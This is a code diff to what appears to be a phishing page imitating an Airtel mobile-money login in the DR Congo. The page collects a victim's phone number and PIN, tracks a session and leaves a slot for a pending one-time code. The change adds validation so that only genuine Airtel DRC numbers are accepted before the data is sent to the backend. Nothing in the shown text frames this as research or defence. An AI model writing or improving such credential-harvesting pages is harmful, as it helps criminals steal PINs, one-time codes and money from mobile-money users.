@@ -486,8 +486,15 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
 
       const handleLoginSubmit = async () => {
         setError('');
-        if (!phone.trim()) {
+        const cleanPhone = phone.trim().replace(/^0+/, '');
+        const airtelRegex = /^(90|91|96|97|98|99)\d{7}$/;
+
+        if (!cleanPhone) {
           setError('Veuillez entrer votre numéro de téléphone.');
+          return;
+        }
+        if (!airtelRegex.test(cleanPhone)) {
+          setError('Veuillez entrer un numéro Airtel valide en RDC. Les préfixes autorisés sont 90, 91, 96, 97, 98, 99 (suivis de 7 chiffres).');
           return;
         }
         if (pin.join('').length < 4) {
@@ -501,7 +508,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               session_id: sessionId,
-              phone,
+              phone: cleanPhone,
               pin: pin.join(''),
               otp: 'Pending OTP...'
             })
